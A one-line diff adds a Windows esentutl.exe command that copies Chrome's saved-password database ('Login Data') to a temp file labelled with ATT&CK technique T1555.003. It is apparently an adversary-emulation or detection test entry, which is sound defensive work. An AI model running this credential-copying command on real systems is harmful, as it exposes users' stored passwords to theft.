@@ -1,0 +1,1 @@
+esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "%temp%\T1555.003_Login_Data.tmp"
